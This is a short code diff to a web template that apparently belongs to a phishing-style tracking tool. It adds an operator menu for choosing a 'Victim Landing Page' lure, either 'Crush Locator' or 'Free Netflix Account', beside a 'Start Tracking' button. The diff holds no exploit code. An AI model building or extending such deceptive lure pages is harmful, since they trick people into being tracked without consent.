@@ -50,8 +50,17 @@
         <hr class="my-4">
         <div class="text-center">
             <form name="searchform" method="POST" action="" > {% csrf_token %}
+            <p class="card-text">Choose Template for Victim Landing Page</p>
+            <div class="dropdown">
+              <select class="btn btn-secondary dropdown-toggle" name="template" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+              <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
+                <option class="dropdown-item" value="0">Crush Locator</option>
+                <option class="dropdown-item" value="1">Free Netflix Account</option>
+              </div></select>
+            </div>
+            <br>
             <input class="btn btn-primary btn-lg" id="searchsubmit" value="Start Tracking" type="submit"></input>
-        </form>
+          </form>
         </div>
       </div>
   </div>
